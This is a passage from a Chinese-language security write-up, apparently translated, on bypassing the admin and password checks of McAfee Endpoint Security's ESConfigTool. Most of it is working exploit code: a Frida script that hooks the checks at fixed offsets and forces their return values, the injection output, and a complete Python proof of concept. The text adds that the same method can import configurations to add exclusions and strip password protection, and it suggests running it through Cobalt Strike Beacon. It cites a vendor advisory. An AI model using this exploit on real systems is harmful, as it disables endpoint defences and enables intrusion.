    ...   '/module',
    ...   'ESP',
    ...   '/unlock',
    ...   'startrek',
    ...   '/plaintext'
    ... ]
    >>> pid = rdev.spawn(args)
    >>> session = rdev.attach(pid)
    >>> session
    Session(pid=11168)
我们已连接，可以看到 `ESConfigTool.exe` 显示正在运行！！！
现在，我们可以将 `JavaScript`代码注入到 `ESConfigTool` 进程中。
## 0x08 The Frida script
本文不会介绍如何创建此脚本，因为本文包含了足够多的信息，以下是完整的脚本
    const configBase = Module.findBaseAddress('ESConfigTool.exe');
    //const adminCheck = configBase.add(0x5240); //32
    const adminCheck = configBase.add(0x5f30); //64
    const BLInvokeMethod = Module.findExportByName('blframework.dll','BLInvokeMethod')
    console.log('[-] Base address is:',configBase);
    console.log('[-] Admin check is:',adminCheck);
    console.log('[-] BLInvokeMethod:',BLInvokeMethod);
    Interceptor.attach(adminCheck, {
      onEnter: function (args) {
        console.log('[+] Hooked admin check function');
      },
      onLeave: function (retval) {
        console.log('[+] Returning true for admin check');
        retval.replace(1);
      }
    });
    Interceptor.attach(BLInvokeMethod, {
      onEnter: function (args) {
        console.log('[+] Hooked BLInvokeMethod function');
      },
      onLeave: function (retval) {
        console.log('[+] Patching password check function');
        retval.replace(0x0);
      }
    });
它确实完成了我们在调试器中手动执行的操作（更改返回值）。让我们注入上述脚本，查看是否起效：
    >>> script = """
    ... const configBase = Module.findBaseAddress('ESConfigTool.exe');
    ... //const adminCheck = configBase.add(0x5240); //32
    ... const adminCheck = configBase.add(0x5f30); //64
    ... const BLInvokeMethod = Module.findExportByName('blframework.dll','BLInvokeMethod')
    ... 
    ... console.log('[-] Base address is:',configBase);
    ... console.log('[-] Admin check is:',adminCheck);
    ... console.log('[-] BLInvokeMethod:',BLInvokeMethod);
    ... 
    ... Interceptor.attach(adminCheck, {
    ...   onEnter: function (args) {
    ...     console.log('[+] Hooked admin check function');
    ...   },
    ...   onLeave: function (retval) {
    ...     console.log('[+] Returning true for admin check');
    ...     retval.replace(1);
    ...   }
    ... });
    ... 
    ... Interceptor.attach(BLInvokeMethod, {
    ...   onEnter: function (args) {
    ...     console.log('[+] Hooked BLInvokeMethod function');
    ...   },
    ...   onLeave: function (retval) {
    ...     console.log('[+] Patching password check function');
    ...     retval.replace(0x0);
    ...   }
    ... });
    ... 
    ... """
    >>> session.create_script(script).load()
    [-] Base address is: 0x7ff73ed30000
    [-] Admin check is: 0x7ff73ed35f30
    [-] BLInvokeMethod: 0x7ffa4d759730
    >>> rdev.resume(pid)
    >>> [+] Hooked admin check function
    [+] Returning true for admin check
    [+] Hooked BLInvokeMethod function
    [+] Patching password check function
    >>>
当然，它看起来像：
(我知道，我是以 “管理员”的用户身份去运行它的，但是它并没有绕过 UAC，所以它和普通用户权限是一样的)
## 0x09 Now what
我们终于找到了排除项的内容，知道了哪些程序是指定排除。由于它可以通过 `TCP` 进行连接工作，所以我们可以使用 `Cobalt Strike
Beacon` 在我们的红队任务中完成此任务。
及时我们在此文章中只讨论了导出 `McAfee`
配置信息，但值得一提的是，你也可以利用此方法，导入自己的配置文件。这意味着可以自己添加排除项，更改其他设置，甚至删掉密码保护。
这里有一个要注意的就是 `"/plaintext"`
参数，这个参数可能有点诡异，有时它其作用，有时又不起作用。也许不同的版本需要不同的功能偏移量，这个得自个儿研究，反正我没有这个烦恼。因为即使
`McAfee` 不提供带此参数的加密配置，你也可以将该加密配置导入你自己的版本中。
如何配置加密？这个以后再说。在 `McAfee PSIRT` 那解决问题之前，上述方法应该是属于私密的。
## 0x10 Remidiation
在谈论 `McAfee PSIRT` 时，他们在
[这里](https://kc.mcafee.com/corporate/index?page=content&id=SB10299)
发布了有关此问题的安全公告及修复程序。实际上我并没有测试过它是否完全修复了，因为我懒。
但是我想到了一件事情：如果他们在 `ESConfigTool` 中对其进行了修复，是否可以利用旧版本的工具作用于新版本的 `McAfee Endpoint
Protection` ？这个谁知道呢。如果你想玩的话，我这已上传了 Python 的 POC 脚本。
    #!/usr/bin/env python
    import frida
    def get_script():
      script = """
    const configBase = Module.findBaseAddress('ESConfigTool.exe');
    //const adminCheck = configBase.add(0x5240); //32
    const adminCheck = configBase.add(0x5f30); //64
    const BLInvokeMethod = Module.findExportByName('blframework.dll','BLInvokeMethod')
    console.log('[-] Base address is:',configBase);
    console.log('[-] Admin check is:',adminCheck);
    console.log('[-] BLInvokeMethod:',BLInvokeMethod);
    Interceptor.attach(adminCheck, {
      onEnter: function (args) {
        console.log('[+] Hooked admin check function');
      },
      onLeave: function (retval) {
        console.log('[+] Returning true for admin check');
        retval.replace(1);
      }
    });
    Interceptor.attach(BLInvokeMethod, {
      onEnter: function (args) {
        console.log('[+] Hooked BLInvokeMethod function');
      },
      onLeave: function (retval) {
        console.log('[+] Patching password check function');
        retval.replace(0x0);
      }
    });
    """
      return script
    def main():
      args = [
        'ESConfigTool.exe',
        '/export',
        'c:\\tem\\ESP.xml',
        '/module',
        'TP',
        '/unlock',
        'starwars',
        # This may fail sometimes, not sure why
        #'/plaintext'
      ]
      devmgr = frida.get_device_manager()
      devmgr.add_remote_device('127.0.0.1')
      rdev = frida.get_device('tcp@127.0.0.1')
      pid = rdev.spawn(args)
      session = rdev.attach(pid)
      session.create_script(get_script()).load()
      rdev.resume(pid)
      input()
    if __name__ == '__main__':
      main()